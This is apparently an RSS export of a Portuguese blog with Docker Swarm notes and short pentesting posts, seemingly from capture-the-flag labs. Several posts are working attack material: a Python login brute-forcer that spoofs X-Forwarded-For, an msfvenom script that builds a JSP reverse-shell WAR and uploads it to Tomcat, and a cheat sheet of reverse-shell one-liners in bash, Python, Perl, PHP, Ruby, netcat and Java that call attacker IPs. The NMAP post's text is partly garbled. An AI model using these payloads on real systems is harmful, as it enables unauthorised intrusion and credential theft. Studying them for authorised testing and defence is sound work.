# curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-`uname -s`-`uname -m` &amp;gt;/tmp/docker-machine # chmod &#43;x /tmp/docker-machine  # sudo cp /tmp/docker-machine /usr/local/bin/docker-machine Para seguir com a instalação no macOS: # curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-`uname -s`-`uname -m` &amp;gt;/usr/local/bin/docker-machine # chmod &#43;x /usr/local/bin/docker-machine Para seguir com a instalação no Windows caso esteja usando o Git bash: # if [[ ! -d &amp;#34;$HOME/bin&amp;#34; ]]; then mkdir -p &amp;#34;$HOME/bin&amp;#34;; fi # curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-Windows-x86_64.exe &amp;gt; &amp;#34;$HOME/bin/docker-machine.exe&amp;#34; # chmod &#43;x &amp;#34;$HOME/bin/docker-machine.exe&amp;#34; Para verificar se ele foi instalado e qual a sua versão, faça: # docker-machine version # docker-machine create --driver virtualbox linuxtips # docker-machine ls # docker-machine env linuxtips # eval &amp;#34;$(docker-machine env linuxtips)&amp;#34; # docker container ls # docker container run busybox echo &amp;#34;LINUXTIPS, VAIIII&amp;#34; # docker-machine ip linuxtips # docker-machine ssh linuxtips # docker-machine inspect linuxtips # docker-machine stop linuxtips # docker-machine ls  # docker-machine start linuxtips # docker-machine rm linuxtips # eval $(docker-machine env -u) Docker Swarm Você consegue construir clusters de containers com caracateristicas importantes como balanceador de cargas e failover.
Para criar um clustercom o docker swarm, basta indicar quais os hosts que ele irá supervisionar e o restante é com ele.
Cuida automaticamente do balanceamento de carga.
O Docker Swarm é bastante simples e se resume a um manager e diversos workers. O manager é o responsavel por orquestrar os containers e distribui-los entre os hosts workers. Os workers são os que carregam o piano, e hospedam os containers.
Worker = Container em execução
Manager = Conhece os detalhes do cluster, sabe todos os containers e serviços.
Para testar, podemos subir três maquinas e instalar o docker em cada uma delas.
root@FXSHELL-01 ~# root@FXSHELL-02 ~# root@FXSHELL-03 ~# Feito isso, basta rodar na maquina 01, o comando:
docker swarm init Será gerado um token, que iremos utilizar e rodar nas maquinas do node, que serão as maquinas 02 e 03.
Depois podera visualizar na maquina manager, todos os nodes que estão adicionados com o comando:
docker node ls Para visualizar o token da maquina 02 para adiciona-la commo manager e não como worker, basta fazer:
docker swarm join-token manager Com isso será exibido o token de manager, para ser executado no seu outro host.
Mesma coisa caso fosse um worker
docker swarm join-token worker Para promover um node worker para manager basta fazer:
docker node promote maquina-02 docker node demote maquina-02 Agora se você quiser remover o node do cluster basta digitar o comando:
docker swarm leave Também remova ele do nosso manager ativo, com o comando
docker node rm maquina-02 Para remover um node manager, é necessário forçar com a flag &amp;ndash;force
docker swarm leave --force E depois remover do node manager
docker node rm maquina-03 Docker Services O service é um VIP ou DNS que realizara o balanceamento de requisições entre os containers. Podemos estabelecer um numero x de containers respondendo por um service e esses containers estarão espalhados pelo nosso cluster, entre nossos nodes, garantindo alta disponibilidade e balanceamento de carga. Tudo isso nativamente.
Os services é uma forma, já utlizada no kubernetes, de você conseguir gerenciar melhor seus containers. Também uma maneira muito simples e efetiva para escalar seu ambiente. Aumentando ou diminuindo a quantidade de containers que responderá para determinado service.
Exemplo:
Nome do service que desejo criar: webserver
Quantidade de containers que desejo debaixo do service: 5
Portas que iremos blindar, entre o service e o node: 8080:80
Imagem dos containers que irei utilizar: NGINX
O comando ficaria assim =&amp;gt;
docker service create --name webserver --replicas 5 -p 8080:80 nginx Para testar faça um curl em qualquer ip dos nodes que subiu:8080
Para listar os services faça
docker service ls Se quisermos saber onde estão rodando nossos containers, em quais nodes eles estçao sendo executados, basta digitar o seguinte comando:
docker service ps webserver Assim conseguiremos saber onde está rodando cada container e ainda o seu status.
Se precisamos saber maiores detalhes sobre o service, basta utlizar o subcomando &amp;ldquo;inspect&amp;rdquo;.
docker service inspect webserver Na saída do &amp;ldquo;inspect&amp;rdquo; conseguiremos pegar informações importantes sobre nosso service, como portas expostas, volumes, containers, limitações, entre outras coisas.
Lembre-se meu cenário de nodes é:
root@FXSHELL-01 ~# root@FXSHELL-02 ~# root@FXSHELL-03 ~# Posso ter muitas replicas divididas e distribuidas e balanceadas nesses 3 nodes.
Uma informação muito importante é o endereço do VIP do service, que estara listado no comando &amp;ldquo;insepect&amp;rdquo;.
Esse é o endereço do IP do balanceador desse service, ou seja, sempre que acessarem via esse IP, ele distribuirá a conexão entre os containers.
Agora se quisermos aumentar o número de containers debaixo desse service, é muito simples. Basta executar o comando a seguir:
docker service scale webserver=5 Pronto, agora temos dez containers respondendo requisições debaido do nosso service webserver.
Para visualizar basta executar:
docker service ls Ah não quero que um determinado node receba mais containers, posso dar um pause neste cara, com o comando abaixo:
docker node update --availability pause FXSHELL-02 Para ativa-lo novamente:
docker node update --availability active FXSHELL-02 Para retirar temporariamente um node para manutenção por exemplo, faça:
docker node update --availability drain FXSHELL-02 Todos os containers que estavam no FXSHELL-02, vão ser realocados para os outros 2.
Para visualizar basta executar:
docker service ps webserver Para saber em quais nodes eseles estão em execução, lembre-se do &amp;lsquo;docker service ls webserver&amp;rsquo;
Para acessar os logs desse service, basta digitar:
docker service logs -f webserver Assim você terá acesso aos logs de todos os containers desse service.
Para remover o service é simples
docker service rm webserver Você pode checar com o comando
docker service ls Criar um service com um volume conectado é bastante simples, basta fazer:
docker service create --name webserver --replicas 5 -p 8080:80 --mount type=volume,src=teste,dst=/app, nginx Quando criamos um service com um volume conectado a ele, isso indica que esse volume estará disponivel em todos os nossos containers desse service, ou seja, o volume com o nome de &amp;ldquo;teste&amp;rdquo; estara montado em todos os containers no diretorio &amp;ldquo;/app&amp;rdquo;.
Exemplo de como ficou:
Docker Secrets! ]]></content:encoded>
    </item>
    <item>
      <title>Steghide</title>
      <link>/posts/steghide/</link>
      <pubDate>Thu, 20 Aug 2020 02:23:34 UT</pubDate>
      <guid>/posts/steghide/</guid>
      <description>$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg </description>
      <content:encoded><![CDATA[$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg ]]></content:encoded>
    </item>
    <item>
      <title>Wfuzz</title>
      <link>/posts/wfuzz/</link>
      <pubDate>Fri, 31 Jul 2020 04:13:20 UT</pubDate>
      <guid>/posts/wfuzz/</guid>
      <description>É umaferramenta de fuzzing criado para facilitar a tarefa de avaliação de aplicações web e baseia-se num conceito muito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
c colorir saída
w caminho da wordlist
hc ignorar erros</description>
      <content:encoded><![CDATA[É umaferramenta de fuzzing criado para facilitar a tarefa de avaliação de aplicações web e baseia-se num conceito muito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
c colorir saída
w caminho da wordlist
hc ignorar erros
]]></content:encoded>
    </item>
    <item>
      <title>GoBuster</title>
      <link>/posts/gobuster/</link>
      <pubDate>Tue, 28 Jul 2020 02:44:29 UT</pubDate>
      <guid>/posts/gobuster/</guid>
      <description>GoBuster Primo do DIRB
O Gobuster é uma ótima ferramenta utilizada para força bruta em URI’s (diretórios e arquivos)
-fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &amp;lt;modo&amp;gt; – qual modo usar, dir ou dns (padrão: dir). -q – desativa a saída de banner / sublinhado. -t &amp;lt;threads&amp;gt; – número de encadeamentos a serem executados (padrão: 10). -u &amp;lt;url / domain&amp;gt; – URL completo (incluindo esquema) ou nome de domínio base.</description>
      <content:encoded><![CDATA[GoBuster Primo do DIRB
O Gobuster é uma ótima ferramenta utilizada para força bruta em URI’s (diretórios e arquivos)
-fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &amp;lt;modo&amp;gt; – qual modo usar, dir ou dns (padrão: dir). -q – desativa a saída de banner / sublinhado. -t &amp;lt;threads&amp;gt; – número de encadeamentos a serem executados (padrão: 10). -u &amp;lt;url / domain&amp;gt; – URL completo (incluindo esquema) ou nome de domínio base. -v – saída detalhada (mostra todos os resultados). -w &amp;lt;wordlist&amp;gt; – caminho para a lista de palavras usada para força bruta (use – para stdin). Eu poderia usar o DIRB? Sim, por que ele vai fazer o scanning de páginas também. Ficaria assim:
$ dirb http://192.168.219.128:65535 /usr/share/dirb/wordlists/big.txt
Com o GoBuster faria o brute force &#43; o scanning de diretórios, utilizando a mesma wordlist do DIRB.
$ gobuster dir -u http://192.168.219.128:65535 -w /usr/share/dirb/wordlists/big.txt
-w &amp;lt;wordlist&amp;gt; -u &amp;lt;url&amp;gt; ]]></content:encoded>
    </item>
    <item>
      <title>Wordlist com Palavras do Site</title>
      <link>/posts/wordlist/</link>
      <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
      <guid>/posts/wordlist/</guid>
      <description>Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
Crie o arquivo brute.py Para executa-lo basta rodar o comando:
$ python3 brute.py
import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.</description>
      <content:encoded><![CDATA[Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
Crie o arquivo brute.py Para executa-lo basta rodar o comando:
$ python3 brute.py
import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&amp;#39;input.&#43;?name=&amp;#34;tokenCSRF&amp;#34;.&#43;?value=&amp;#34;(.&#43;?)&amp;#34;&amp;#39;, login_page.text).group(1) print(&amp;#39;[*] Trying: {p}&amp;#39;.format(p = password)) headers = { &amp;#39;X-Forwarded-For&amp;#39;: password, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&amp;#39;, &amp;#39;Referer&amp;#39;: login_url } data = { &amp;#39;tokenCSRF&amp;#39;: csrf_token, &amp;#39;username&amp;#39;: username, &amp;#39;password&amp;#39;: password, &amp;#39;save&amp;#39;: &amp;#39;&amp;#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &amp;#39;location&amp;#39; in login_result.headers: if &amp;#39;/admin/dashboard&amp;#39; in login_result.headers[&amp;#39;location&amp;#39;]: print() print(&amp;#39;SUCCESS: Password found!&amp;#39;) print(&amp;#39;Use {u}:{p} to login.&amp;#39;.format(u = username, p = password)) print() break ]]></content:encoded>
    </item>
    <item>
      <title>Dirsearch</title>
      <link>/posts/dirsearch/</link>
      <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
      <guid>/posts/dirsearch/</guid>
      <description>DIRSEARCH ================ https://github.com/maurosoria/dirsearch
O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
Uso git clone https://github.com/maurosoria/dirsearch.git
$ cd dirsearch
python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *</description>
      <content:encoded><![CDATA[DIRSEARCH ================ https://github.com/maurosoria/dirsearch
O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
Uso git clone https://github.com/maurosoria/dirsearch.git
$ cd dirsearch
python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *
_|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6552 | Request count: 6552 Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log Target: http://10.10.10.185 Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24 [23:59:24] Starting: [00:00:12] 301 - 313B - /images -&amp;gt; http://10.10.10.185/images/ [00:00:14] 403 - 277B - /index.shtml [00:00:14] 200 - 67KB - /index.php [00:00:14] 200 - 67KB - /index.php/login/ [00:00:14] 403 - 277B - /install.sql [00:00:17] 403 - 277B - /localhost.sql [00:00:17] 403 - 277B - /log.sqlite [00:00:18] 200 - 4KB - /login.php [00:00:18] 403 - 277B - /login.shtml [00:00:19] 403 - 277B - /logs.sqlite O dirsearch vai encontrar pastas e urls uteis para a exploração de vulnerabilidades.
]]></content:encoded>
    </item>
    <item>
      <title>sh_MSFvenom</title>
      <link>/posts/sh_msfvenom/</link>
      <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
      <guid>/posts/sh_msfvenom/</guid>
      <description>echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.</description>
      <content:encoded><![CDATA[echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&amp;#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar  # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e chame o arquivo que você acabou de fazer o upload
http://10.10.10.194:8080/exploit.war/
volte no terminal, ele vai ter conectado via shell agora execute o shell reverso em python para o term
listening on [any] 4444 &amp;hellip; connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
$ python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
]]></content:encoded>
    </item>
    <item>
      <title>The_silver_searcher</title>
      <link>/posts/the_silver_searcher/</link>
      <pubDate>Thu, 23 Jul 2020 02:17:35 UT</pubDate>
      <guid>/posts/the_silver_searcher/</guid>
      <description>AG ====== https://github.com/ggreer/the_silver_searcher
Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
apt-get install silversearcher-ag</description>
      <content:encoded><![CDATA[AG ====== https://github.com/ggreer/the_silver_searcher
Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
apt-get install silversearcher-ag
]]></content:encoded>
    </item>
    <item>
      <title>Netcat</title>
      <link>/posts/netcat/</link>
      <pubDate>Thu, 23 Jul 2020 02:02:18 UT</pubDate>
      <guid>/posts/netcat/</guid>
      <description>Netcat ================
O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confiável de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração e exploração de rede rica em recursos, pois pode criar quase qualquer tipo de conexão que você precisa e possui vários recursos internos interessantes.</description>
      <content:encoded><![CDATA[Netcat ================
O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confiável de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração e exploração de rede rica em recursos, pois pode criar quase qualquer tipo de conexão que você precisa e possui vários recursos internos interessantes. Os usos comuns incluem:
&#43; Proxies TCP simples &#43; Clientes e servidores HTTP baseados em shell-script &#43; Teste de daemon de rede &#43; A Socks ou HTTP ProxyCommand para ssh Sintaxe:
$ nc -nlvp 1234
-n Não faça pesquisas de serviço ou DNS em endereços, nomes de host ou portas especificados.
-l Usado para especificar que o nc deve escutar uma conexão de entrada em vez de iniciar uma conexão com um host remoto. É um erro usar esta opção em conjunto com as opções -p, -s ou -z. Além disso, qualquer tempo limite especificado com a opção -w é ignorado.
-v Faça nc dar uma saída mais detalhada.
-p source_port Especifica a porta de origem que a nc deve usar, sujeita a restrições e disponibilidade de privilégios.
Ou seja, com ele podemos ouvir a porta TCP/UDP podemos colocar o nc escutando na porta 1234 uma conexão, para usar um shell reverso por exemplo.
]]></content:encoded>
    </item>
    <item>
      <title>Reverse Shell</title>
      <link>/posts/dicasdereverseshell/</link>
      <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
      <guid>/posts/dicasdereverseshell/</guid>
      <description>Python =====================
python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.15&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; Bash =====================
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
perl -e &#39;use Socket;$i=&amp;quot;10.0.0.1&amp;quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; PHP =====================
php -r &#39;$sock=fsockopen(&amp;quot;10.0.0.1&amp;quot;,1234);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; Ruby =====================
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.0.0.1&amp;quot;,1234).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39; Netcat =====================
nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
r = Runtime.getRuntime() p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.</description>
      <content:encoded><![CDATA[Python =====================
python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.15&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; Bash =====================
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
perl -e &#39;use Socket;$i=&amp;quot;10.0.0.1&amp;quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; PHP =====================
php -r &#39;$sock=fsockopen(&amp;quot;10.0.0.1&amp;quot;,1234);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; Ruby =====================
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.0.0.1&amp;quot;,1234).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39; Netcat =====================
nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
r = Runtime.getRuntime() p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
xterm -display 10.0.0.1:1 Xnest :1 xhost &#43;targetip ]]></content:encoded>
    </item>
    <item>
      <title>Nikto</title>
      <link>/posts/nikto/</link>
      <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
      <guid>/posts/nikto/</guid>
      <description>NIKTO ================
Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
 Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados  Não é necessário fazer a instalação do mesmo pois ele é um script perl.
Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
https://github.com/sullo/nikto
git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter .</description>
      <content:encoded><![CDATA[NIKTO ================
Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
 Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados  Não é necessário fazer a instalação do mesmo pois ele é um script perl.
Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
https://github.com/sullo/nikto
git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter ./nikto.pl -h http://www.example.com # Run using perl (if you forget to chmod) perl nikto.pl -h http://www.example.com -h &#43; alvo (por padrão setada porta 80) -o posso gerar relatório em html ou txt, csv. -p posso setar as portas que quero separados por virgula. exemplo: nikto -h 192.168.0.126 -p 8081, 443 -o scan.html
Toda vez que precisar rodar o nikto em diferentes diretorios do seu alvo, é necessário colocar o &amp;lsquo;http&amp;rsquo; na frente.
ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
]]></content:encoded>
    </item>
    <item>
      <title>Searchexploit</title>
      <link>/posts/searchexploit/</link>
      <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
      <guid>/posts/searchexploit/</guid>
      <description>SEARCHSPLOIT ================
Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.</description>
      <content:encoded><![CDATA[SEARCHSPLOIT ================
Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
Com as informações dos serviços coletados pelo NMAP, seria maneiro procurar no searchsploit se este serviço contém alguma vulnerabilidade, procurando um exploit para ele.
Neste caso podemos usar o searchsploit da seguinte maneira:
fpmatta@T-REX ~&amp;gt; searchsploit vsftpd ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- vsftpd 2.0.5 - &amp;#39;CWD&amp;#39; (Authenticated) Remot | linux/dos/5814.pl vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31818.sh vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31819.pl vsftpd 2.3.2 - Denial of Service | linux/dos/16270.c vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb ------------------------------------------- --------------------------------- Para atualizar a base do searchsploit faça:
$ searchsploit -u
Se não tiver ele instalado no seu S.O (caso não esteja utilizando o Kali linux):
Clone o repositório, adicione o binário ao seu $PATH e edite o arquivo de configuração para refletir o caminho do git:
$ sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
$ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
]]></content:encoded>
    </item>
    <item>
      <title>NMAP</title>
      <link>/posts/toolsforpentest/</link>
      <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
      <guid>/posts/toolsforpentest/</guid>
      <description>NMAP ================
O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais serviços ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras características. o N nor utilizado para audito seg adm e sistemas e red úti rot omo inventário d ger ser atu ados, e monitora disponibilidade de serviço.</description>
      <content:encoded><![CDATA[NMAP ================
O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais serviços ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras características. o N nor utilizado para audito seg adm e sistemas e red úti rot omo inventário d ger ser atu ados, e monitora disponibilidade de serviço.
Para cada caso de enumeração e circunstâncias, existe flags especificas para cada tipo de alvo, geralmente dou um scan superficial no inicio, e depois utilizo algo mais profundo. As flags que mais utilizo são as seguintes:
nmap -sV -sC -Pn -T4 -v -p- &amp;ndash;min-rate=10000 Identifica hosts ativos com a porta 445 aberta
nmap &amp;ndash;open -v -sS -p 445 -Pn 293.268.20.0/34 -oG smb.txt Cria arquivo com uma saída mais limpa, somente IPs
cat smb.txt |grep &amp;ldquo;Up&amp;rdquo;|cut -d &amp;quot;&amp;quot; -f2 &amp;gt; targets Canivete suiço para enumerar os hosts (nome,dominio..)
crackmapexec smb targets Capturar hashes NBT-NS / LLMNR
Alterar o arquivo /etc/responder/Responder.conf
; Specific IP Addresses to respond to (default = All) ; Example: RespondTo = 10.20.1.100-150, 10.20.3.10 RespondTo = &amp;lt;host_1&amp;gt;&amp;lt;host_2&amp;gt;&amp;lt;host_3&amp;gt;&amp;lt;host_4&amp;gt;&amp;lt;&amp;hellip;&amp;gt;
responder -l -Prv Também são muito utilizadas as flags abaixo desde o mais simples para um scan mais completo.
